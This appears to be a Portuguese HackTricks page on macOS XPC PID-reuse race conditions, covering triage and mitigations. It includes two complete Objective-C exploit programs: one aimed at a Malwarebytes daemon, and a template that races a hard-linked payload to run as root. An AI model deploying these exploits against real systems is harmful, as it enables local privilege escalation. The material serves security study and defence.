# macOS PID Reuse

{{#include ../../../../../../banners/hacktricks-training.md}}

## PID Reuse

Quando um **XPC service** do macOS autentica um caller resolvendo seu **PID**, em vez de usar credenciais vinculadas à mensagem recebida, ele pode estar vulnerável a um ataque de PID reuse. A primitiva prática não consiste em esperar o namespace de PIDs dar a volta completa: o attacker envia uma requisição XPC e chama imediatamente **`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`** com `POSIX_SPAWN_SETEXEC`, substituindo a imagem do processo do attacker por um **allowed binary enquanto mantém o PID**.<sup>[[1]](#references)[[2]](#references)</sup>

Se o server retirar a requisição da fila e somente então resolver esse PID numérico para um processo ativo para verificar code-signing, entitlement, path ou parent-process, ele observará o binary substituto em vez do processo que enviou a mensagem. `POSIX_SPAWN_START_SUSPENDED` mantém o trusted replacement ativo e estável enquanto o server realiza a verificação.<sup>[[1]](#references)[[2]](#references)</sup>

### O que realmente entra na race

A sequência vulnerável é uma **message-identity TOCTOU**, e não simplesmente “PIDs podem se repetir”:<sup>[[1]](#references)[[2]](#references)</sup>

1. Um processo attacker estabelece ou retoma uma conexão XPC e coloca a requisição privilegiada na fila.
2. Antes que o service converta o PID da conexão em um `SecCodeRef` ou outro process object, o attacker sobrepõe o mesmo processo com um executable aprovado usando `POSIX_SPAWN_SETEXEC`.
3. O service valida a approved image atualmente vinculada a esse PID e, em seguida, despacha a requisição controlada pelo attacker que já estava na fila.

Qualquer PID bridge em um authorization data flow é suspeito: `-[NSXPCConnection processIdentifier]`, `xpc_connection_get_pid` ou `audit_token_to_pid` seguido por `SecCodeCopyGuestWithAttributes`/`kSecGuestAttributePid`, `proc_pidpath`, `NSRunningApplication(processIdentifier:)` ou um custom signature verifier. Um PID usado apenas para logging não é suficiente; confirme se ele chega à decisão de allow/deny. Inspecione também os error paths: tentar primeiro uma audit-token lookup, mas **recorrer ao PID em caso de falha**, restaura a mesma race. Esse fallback pattern apareceu em uma análise de 2026 dos privileged XPC services da Intego.<sup>[[3]](#references)</sup>

### Triage estático e dinâmico rápido

Comece pelo connection handler e rastreie cada chamada que produz um PID até as verificações de code-signing, entitlement, executable-path ou version. Estes comandos fornecem uma primeira análise rápida de um helper candidato; binaries stripped ainda costumam expor imported symbols, Objective-C selectors ou diagnostic strings:<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
```bash
BIN="/path/to/privileged/helper"
nm -um "$BIN" 2>/dev/null | rg 'xpc_connection_get_pid|SecCodeCopyGuestWithAttributes'
otool -ov "$BIN" 2>/dev/null | rg 'processIdentifier|auditToken|setCodeSigningRequirement'
strings -a "$BIN" | rg -i 'guest.*pid|signature.*pid|process identifier|audit token|peer.*requirement'
```
Durante um teste controlado, interrompa ou faça hook tanto na fonte do PID quanto no verificador. Um acesso a `xpc_connection_get_pid` ou `-processIdentifier` é apenas uma pista; a evidência útil é uma consulta posterior do **mesmo inteiro** depois que a solicitação foi recebida. O Frida também pode fazer hook no verificador específico da aplicação e no seletor privilegiado para medir se o seletor é executado quando a corrida do PID vence.<sup>[[3]](#references)</sup>

### Exemplo de exploit

Se você encontrar a função **`shouldAcceptNewConnection`** ou uma função chamada por ela **chamando** **`processIdentifier`** e não chamando **`auditToken`**, isso provavelmente significa que ela está **verificando o PID do processo** e não o audit token.\
Como, por exemplo, nesta imagem (retirada da referência):<sup>[[1]](#references)</sup>

<figure><img src="../../../../../../images/image (306).png" alt="https://wojciechregula.blog/images/2020/04/pid.png"><figcaption></figcaption></figure>

Confira este exemplo de exploit (também retirado da referência) para ver as 2 partes do exploit:<sup>[[1]](#references)</sup>

- Uma que **gera vários forks**
- **Cada fork** irá **enviar** o **payload** ao serviço XPC enquanto executa **`posix_spawn`** logo depois de enviar a mensagem.

> [!CAUTION]
> Ao fazer uma corrida com `fork()` a partir de um processo Objective-C, execute o exploit com `OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES` exportado ou incorpore o marcador `__objc_fork_ok`:
>
> ```objectivec
> asm(".section __DATA,__objc_fork_ok\n"
> "empty:\n"
> ".no_dead_strip empty\n");
> ```

{{#tabs}}
{{#tab name="NSTasks"}}
Primeira opção usando **`NSTasks`** e um argumento para iniciar os filhos e explorar o RC
```objectivec
// Code from https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/
// gcc -framework Foundation expl.m -o expl

#import <Foundation/Foundation.h>
#include <spawn.h>
#include <sys/stat.h>

#define RACE_COUNT 32
#define MACH_SERVICE @"com.malwarebytes.mbam.rtprotection.daemon"
#define BINARY "/Library/Application Support/Malwarebytes/MBAM/Engine.bundle/Contents/PlugIns/RTProtectionDaemon.app/Contents/MacOS/RTProtectionDaemon"

// allow fork() between exec()
asm(".section __DATA,__objc_fork_ok\n"
"empty:\n"
".no_dead_strip empty\n");

extern char **environ;

// defining necessary protocols
@protocol ProtectionService
- (void)startDatabaseUpdate;
- (void)restoreApplicationLauncherWithCompletion:(void (^)(BOOL))arg1;
- (void)uninstallProduct;
- (void)installProductUpdate;
- (void)startProductUpdateWith:(NSUUID *)arg1 forceInstall:(BOOL)arg2;
- (void)buildPurchaseSiteURLWithCompletion:(void (^)(long long, NSString *))arg1;
- (void)triggerLicenseRelatedChecks;
- (void)buildRenewalLinkWith:(NSUUID *)arg1 completion:(void (^)(long long, NSString *))arg2;
- (void)cancelTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)startTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)unredeemLicenseKeyWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)applyLicenseWith:(NSUUID *)arg1 key:(NSString *)arg2 completion:(void (^)(long long))arg3;
- (void)controlProtectionWithRawFeatures:(long long)arg1 rawOperation:(long long)arg2;
- (void)restartOS;
- (void)resumeScanJob;
- (void)pauseScanJob;
- (void)stopScanJob;
- (void)startScanJob;
- (void)disposeOperationBy:(NSUUID *)arg1;
- (void)subscribeTo:(long long)arg1;
- (void)pingWithTag:(NSUUID *)arg1 completion:(void (^)(NSUUID *, long long))arg2;
@end

void child() {

// send the XPC messages
NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
xpcConnection.remoteObjectInterface = remoteInterface;

[xpcConnection resume];
[xpcConnection.remoteObjectProxy restartOS];

char target_binary[] = BINARY;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

bool create_nstasks() {

NSString *exec = [[NSBundle mainBundle] executablePath];
NSTask *processes[RACE_COUNT];

for (int i = 0; i < RACE_COUNT; i++) {
processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
}

int i = 0;
struct timespec ts = {
.tv_sec = 0,
.tv_nsec = 500 * 1000000,
};

nanosleep(&ts, NULL);
if (++i > 4) {
for (int i = 0; i < RACE_COUNT; i++) {
[processes[i] terminate];
}
return false;
}

return true;
}

int main(int argc, const char * argv[]) {

if(argc > 1) {
// called from the NSTasks
child();

} else {
NSLog(@"Starting the race");
create_nstasks();
}

return 0;
}
```
{{#endtab}}

{{#tab name="fork"}}
Este exemplo usa um **`fork`** bruto para iniciar **filhos que explorarão a condição de corrida de PID** e, em seguida, explorar **outra condição de corrida por meio de um Hard link:**
```objectivec
// export OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES
// gcc -framework Foundation expl.m -o expl

#include <Foundation/Foundation.h>
#include <spawn.h>
#include <pthread.h>

// TODO: CHANGE PROTOCOL AND FUNCTIONS
@protocol HelperProtocol
- (void)DoSomething:(void (^)(_Bool))arg1;
@end

// Global flag to track exploitation status
bool pwned = false;

/**
* Continuously overwrite the contents of the 'hard_link' file in a race condition to make the
* XPC service verify the legit binary and then execute as root out payload.
*/
void *check_race(void *arg) {
while(!pwned) {
// Overwrite with contents of the legit binary
system("cat ./legit_bin > hard_link");
usleep(50000);

// Overwrite with contents of the payload to execute
// TODO: COMPILE YOUR OWN PAYLOAD BIN
system("cat ./payload > hard_link");
usleep(50000);
}
return NULL;
}

void child_xpc_pid_rc_abuse(){
// TODO: INDICATE A VALID BIN TO BYPASS SIGN VERIFICATION
#define kValid "./Legit Updater.app/Contents/MacOS/Legit"
extern char **environ;

// Connect with XPC service
// TODO: CHANGE THE ID OF THE XPC TO EXPLOIT
NSString*  service_name = @"com.example.Helper";
NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];
// TODO: CNAGE THE PROTOCOL NAME
NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)];
[connection setRemoteObjectInterface:interface];
[connection resume];

id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError* error) {
NSLog(@"[-] Something went wrong");
NSLog(@"[-] Error: %@", error);
}];

NSLog(@"obj: %@", obj);
NSLog(@"conn: %@", connection);

// Call vulenrable XPC function
// TODO: CHANGE NAME OF FUNCTION TO CALL
[obj DoSomething:^(_Bool b){
NSLog(@"Response, %hdd", b);
}];

// Change current process to the legit binary suspended
char target_binary[] = kValid;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

/**
* Function to perform the PID race condition using children calling the XPC exploit.
*/
void xpc_pid_rc_abuse() {
#define RACE_COUNT 1
extern char **environ;
int pids[RACE_COUNT];

// Fork child processes to exploit
for (int i = 0; i < RACE_COUNT; i++) {
int pid = fork();
if (pid == 0) {  // If a child process
child_xpc_pid_rc_abuse();
}
printf("forked %d\n", pid);
pids[i] = pid;
}

// Wait for children to finish their tasks
sleep(3);

// Terminate child processes
for (int i = 0; i < RACE_COUNT; i++) {
if (pids[i]) {
kill(pids[i], 9);
}
}
}

int main(int argc, const char * argv[]) {
// Create and set execution rights to 'hard_link' file
system("touch hard_link");
system("chmod +x hard_link");

// Create thread to exploit sign verification RC
pthread_t thread;
pthread_create(&thread, NULL, check_race, NULL);

while(!pwned) {
// Try creating 'download' directory, ignore errors
system("mkdir download 2>/dev/null");

// Create a hardlink
// TODO: CHANGE NAME OF FILE FOR SIGN VERIF RC
system("ln hard_link download/legit_bin");

xpc_pid_rc_abuse();
usleep(10000);

// The payload will generate this file if exploitation is successful
if (access("/tmp/pwned", F_OK ) == 0) {
pwned = true;
}
}

return 0;
}
```
{{#endtab}}
{{#endtabs}}

## Tornando a race reproduzível

Os seguintes pontos de ajuste se repetem em exploits funcionais de reutilização de PID e em testes recentes de privileged helpers:<sup>[[1]](#references)[[3]](#references)</sup>

- Envie a request e chame `posix_spawn` imediatamente; **não** espere pela reply. A request já deve estar enfileirada enquanto a busca do PID pelo servidor ocorre após a substituição da imagem.
- Mantenha `POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED` juntos. A primeira flag preserva o PID do processo envolvido na race; a segunda impede que o target válido saia ou mude de estado antes da validação.
- Use vários racers de curta duração e repita a sequência completa de conexão/request/exec. A quantidade ideal depende do target; um número excessivo de children pode desacelerar o serviço e piorar a janela.
- A substituição deve satisfazer todo o requisito do servidor. Reutilize o binário legítimo do client quando possível e verifique primeiro o designated requirement dele com `codesign -d -r- "/path/to/client.app"`.
- Primeiro invoque um selector exportado inofensivo ou um método somente leitura. Isso separa a autenticação vencida da exploração bem-sucedida de uma primitive privilegiada posterior.

## Evitando a ponte de PID

No macOS 13+, o Foundation expõe `-[NSXPCConnection setCodeSigningRequirement:]`. Defina o requisito do peer exatamente uma vez e **antes** de `resume`; strings de requisito malformadas geram uma exception (ou um fatal error no Swift), e uma message de um peer que não satisfaz o requisito invalida a connection. Isso permite que o XPC imponha a identidade de código do peer sem que o código da aplicação resolva um PID.<sup>[[6]](#references)</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)l shouldAcceptNewConnection:(NSXPCConnection *)c {
@try {
NSString *req = @"anchor apple generic and identifier \"com.example.client\" "
@"and certificate leaf[subject.OU] = \"TEAMID\"";
[c setCodeSigningRequirement:req];
} @catch (NSException *e) {
return NO;
}
c.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(Helper)];
c.exportedObject = self;
[c resume];
return YES;
}
```
Para a API moderna de listener de baixo nível no macOS 26+, `xpc_listener_set_peer_requirement` aplica um `xpc_peer_requirement_t` validado enquanto o listener está inativo. O XPC descarta solicitações que não atendem a esse requisito; as sessões peer criadas a partir do listener **não** o herdam, portanto aplique também um requisito de sessão apropriado quando essas sessões autorizarem operações privilegiadas.<sup>[[7]](#references)</sup>

> [!WARNING]
> Não “corrija” isso copiando um audit token e convertendo-o novamente em um PID para a consulta real de `SecCode`. Mantenha a identidade derivada do audit token durante a decisão de autorização ou use uma API de peer-requirement do XPC de ponta a ponta.<sup>[[2]](#references)[[6]](#references)</sup> As APIs de audit token no nível da conexão também têm uma classe distinta de race condition, abordada em [macOS xpc_connection_get_audit_token Attack](macos-xpc_connection_get_audit_token-attack.md).

## Other examples

- [**Intego X9: Por que seu antivírus para macOS não deve confiar em PIDs**](https://blog.quarkslab.com/intego_lpe_macos_2.html) - LPE contra o helper privilegiado de um AV que autenticava clientes por PID.<sup>[[3]](#references)</sup>
- [**Explorando o serviço XPC do GOG Galaxy para escalada de privilégios no macOS**](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)<sup>[[4]](#references)</sup>
- [**Rootpipe Reborn (Parte II)**](https://objective-see.org/blog/blog_0x41.html)<sup>[[5]](#references)</sup>



## References

- [1] [Aprenda a explorar o XPC - Parte 2: diga não ao PID!](https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/)
- [2] [Não confie no PID! Histórias de um simples bug lógico e onde encontrá-lo - Samuel Groß (WarCon 2018)](https://saelo.github.io/presentations/warcon18_dont_trust_the_pid.pdf)
- [3] [Intego X9: Por que seu antivírus para macOS não deve confiar em PIDs](https://blog.quarkslab.com/intego_lpe_macos_2.html)
- [4] [Explorando o serviço XPC do GOG Galaxy para escalada de privilégios no macOS](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)
- [5] [Rootpipe Reborn (Parte II)](https://objective-see.org/blog/blog_0x41.html)
- [6] [Apple Developer — `NSXPCConnection.setCodeSigningRequirement`](https://developer.apple.com/documentation/foundation/nsxpcconnection/setcodesigningrequirement(_:))
- [7] [Apple Developer — `xpc_listener_set_peer_requirement`](https://developer.apple.com/documentation/xpc/xpc_listener_set_peer_requirement)
{{#include ../../../../../../banners/hacktricks-training.md}}
